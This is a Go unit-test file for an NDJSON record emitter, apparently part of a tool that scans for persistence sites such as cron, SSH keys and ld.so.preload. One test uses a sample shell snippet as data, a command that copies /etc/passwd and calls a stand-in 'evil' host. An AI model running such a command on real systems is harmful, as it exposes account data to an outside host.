package core

import (
	"bufio"
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"sync"
	"testing"
)

// TestNDJSONEmit_OneRecordOneLine pins the load-bearing contract: one
// Record produces exactly one '\n'-terminated JSON line. Downstream
// pipelines split on newlines, so two records on one line or one
// record spanning multiple lines would silently corrupt the data.
func TestNDJSONEmit_OneRecordOneLine(t *testing.T) {
	var buf bytes.Buffer
	e := NewNDJSONEmitter(&buf)

	rec := Record{Module: "cron", SiteClass: "cron.d", Locus: "/etc/crontab"}
	if err := e.Emit(rec); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	if err := e.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}

	out := buf.Bytes()
	if !bytes.HasSuffix(out, []byte("\n")) {
		t.Errorf("output missing trailing newline: %q", out)
	}
	if got := bytes.Count(out, []byte("\n")); got != 1 {
		t.Errorf("newline count = %d; want 1 in output %q", got, out)
	}

	var got Record
	if err := json.Unmarshal(bytes.TrimRight(out, "\n"), &got); err != nil {
		t.Fatalf("output is not valid JSON: %v\n  raw: %q", err, out)
	}
	if got.Module != "cron" || got.SiteClass != "cron.d" || got.Locus != "/etc/crontab" {
		t.Errorf("round-trip lost fields: got %+v", got)
	}
}

// TestNDJSONEmit_MultipleRecords confirms each record gets its own line
// and that records do NOT share whitespace, indentation, or commas.
func TestNDJSONEmit_MultipleRecords(t *testing.T) {
	var buf bytes.Buffer
	e := NewNDJSONEmitter(&buf)

	records := []Record{
		{Module: "cron", SiteClass: "cron.d", Locus: "/etc/crontab"},
		{Module: "ssh", SiteClass: "ssh.authkeys", Locus: "/root/.ssh/authorized_keys"},
		{Module: "ldso", SiteClass: "ldso.preload", Locus: "/etc/ld.so.preload"},
	}
	for _, r := range records {
		if err := e.Emit(r); err != nil {
			t.Fatalf("Emit(%q): %v", r.Module, err)
		}
	}
	if err := e.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}

	lines := bytes.Split(bytes.TrimRight(buf.Bytes(), "\n"), []byte("\n"))
	if len(lines) != len(records) {
		t.Fatalf("got %d lines; want %d. Output: %q", len(lines), len(records), buf.Bytes())
	}
	for i, line := range lines {
		var got Record
		if err := json.Unmarshal(line, &got); err != nil {
			t.Errorf("line %d not valid JSON: %v\n  bytes: %q", i, err, line)
			continue
		}
		if got.Module != records[i].Module {
			t.Errorf("line %d module = %q; want %q", i, got.Module, records[i].Module)
		}
	}
}

// TestNDJSONEmit_NoHTMLEscaping pins the SetEscapeHTML(false) decision.
// Without it, '<', '>' and '&' would be encoded as '<' etc, which
// is correct for HTML contexts but wrong for our log pipeline (it
// changes byte-for-byte equality of records that the downstream backend
// uses for deduplication).
func TestNDJSONEmit_NoHTMLEscaping(t *testing.T) {
	var buf bytes.Buffer
	e := NewNDJSONEmitter(&buf)

	// content_snippet is a likely vehicle for '<', '>', '&' since
	// shell scripts pipe and redirect with these characters.
	rec := Record{
		Module:         "cron",
		SiteClass:      "cron.d",
		ContentSnippet: "cat /etc/passwd > /tmp/x && curl http://evil/?a=1&b=2",
	}
	if err := e.Emit(rec); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	if err := e.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}

	out := buf.String()
	for _, frag := range []string{"\\u003c", "\\u003e", "\\u0026"} {
		if strings.Contains(out, frag) {
			t.Errorf("output contains HTML-escaped sequence %q\n  raw: %s",
				frag, out)
		}
	}
	for _, frag := range []string{">", "&"} {
		if !strings.Contains(out, frag) {
			t.Errorf("output missing raw byte %q\n  raw: %s", frag, out)
		}
	}
}

// TestNDJSONEmit_CloseFlushes ensures buffered bytes reach the
// underlying writer only after Close. This is the contract callers
// rely on: if a process is killed before Close, the LAST partial
// record may be missing but the file is still parseable up to the
// previous newline.
func TestNDJSONEmit_CloseFlushes(t *testing.T) {
	var buf bytes.Buffer
	e := NewNDJSONEmitter(&buf)

	rec := Record{Module: "cron", SiteClass: "cron.d"}
	if err := e.Emit(rec); err != nil {
		t.Fatalf("Emit: %v", err)
	}
	// Pre-Close, the buffer may or may not be flushed depending on
	// bufio sizing; this test pins only that Close itself flushes.
	if err := e.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}
	if buf.Len() == 0 {
		t.Error("buffer is empty after Close; expected the record to be flushed")
	}
}

// TestNDJSONEmit_ConcurrentSafe is the test the goroutine-safety
// promise on NDJSONEmitter exists for: many goroutines emitting at
// once must produce a well-formed NDJSON stream with no interleaved
// bytes. Each line must parse as a complete Record.
func TestNDJSONEmit_ConcurrentSafe(t *testing.T) {
	var buf bytes.Buffer
	e := NewNDJSONEmitter(&buf)

	const goroutines = 12
	const perGoroutine = 200

	var wg sync.WaitGroup
	for g := 0; g < goroutines; g++ {
		wg.Add(1)
		go func(modID int) {
			defer wg.Done()
			for i := 0; i < perGoroutine; i++ {
				rec := Record{
					Module:    fmt.Sprintf("mod-%d", modID),
					SiteClass: fmt.Sprintf("sc-%d-%d", modID, i),
					Locus:     fmt.Sprintf("/etc/fake-%d-%d", modID, i),
				}
				if err := e.Emit(rec); err != nil {
					t.Errorf("goroutine %d iter %d: Emit: %v", modID, i, err)
					return
				}
			}
		}(g)
	}
	wg.Wait()
	if err := e.Close(); err != nil {
		t.Fatalf("Close: %v", err)
	}

	want := goroutines * perGoroutine
	sc := bufio.NewScanner(&buf)
	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
	lineCount := 0
	for sc.Scan() {
		var rec Record
		if err := json.Unmarshal(sc.Bytes(), &rec); err != nil {
			t.Errorf("line %d not valid JSON: %v\n  bytes: %q",
				lineCount, err, sc.Text())
		}
		lineCount++
	}
	if err := sc.Err(); err != nil {
		t.Errorf("scanner error: %v", err)
	}
	if lineCount != want {
		t.Errorf("line count = %d; want %d", lineCount, want)
	}
}

// erroringWriter returns the configured error on every Write. Used to
// verify that write failures eventually surface to the caller, even
// when buffered.
type erroringWriter struct{ err error }

func (w erroringWriter) Write(p []byte) (int, error) { return 0, w.err }

// TestNDJSONEmit_ErrorSurfacesOnClose: bufio.Writer keeps the first
// emission in its buffer (default 4 KiB), so Emit returns nil. Close
// flushes and that is where the error appears.
func TestNDJSONEmit_ErrorSurfacesOnClose(t *testing.T) {
	sentinel := errors.New("synthetic write failure")
	e := NewNDJSONEmitter(erroringWriter{err: sentinel})

	rec := Record{Module: "cron", SiteClass: "cron.d"}
	// Emit may return nil here because the record fits in the
	// bufio buffer. That is the contract of NDJSONEmitter; the
	// Close error is what callers must check.
	_ = e.Emit(rec)
	err := e.Close()
	if !errors.Is(err, sentinel) {
		t.Errorf("Close error = %v; want errors.Is(...) %v", err, sentinel)
	}
}

// TestNDJSONEmit_ErrorSurfacesOnLargeEmit: when a single Emit produces
// more bytes than the internal buffer can hold, bufio MUST flush mid-
// write and surface the underlying writer's error directly to the
// Emit caller. This pins that fast-path.
func TestNDJSONEmit_ErrorSurfacesOnLargeEmit(t *testing.T) {
	sentinel := errors.New("synthetic write failure")
	e := NewNDJSONEmitter(erroringWriter{err: sentinel})

	rec := Record{
		Module:    "long",
		SiteClass: "long.site",
		// 8 KiB ExecTarget guarantees the encoded record exceeds
		// bufio's default 4 KiB buffer in one shot.
		ExecTarget: strings.Repeat("x", 8192),
	}
	err := e.Emit(rec)
	if !errors.Is(err, sentinel) {
		t.Errorf("Emit error = %v; want errors.Is(...) %v", err, sentinel)
	}
	// Close should also surface the same error path; in some
	// implementations it returns nil because the buffer is now empty.
	// We do not pin Close behavior here; the Emit error is the contract.
	_ = e.Close()
}

// TestNDJSONEmit_EmitErrorMessageIdentifiesRecord confirms the wrapped
// error from Emit carries the module / site_class so a misbehaving
// record is identifiable in a busy NDJSON stream.
func TestNDJSONEmit_EmitErrorMessageIdentifiesRecord(t *testing.T) {
	sentinel := errors.New("boom")
	e := NewNDJSONEmitter(erroringWriter{err: sentinel})

	rec := Record{
		Module:     "marker-mod",
		SiteClass:  "marker-sc",
		ExecTarget: strings.Repeat("x", 8192),
	}
	err := e.Emit(rec)
	if err == nil {
		t.Fatal("expected error, got nil")
	}
	msg := err.Error()
	if !strings.Contains(msg, "marker-mod") {
		t.Errorf("error message missing module: %q", msg)
	}
	if !strings.Contains(msg, "marker-sc") {
		t.Errorf("error message missing site_class: %q", msg)
	}
}
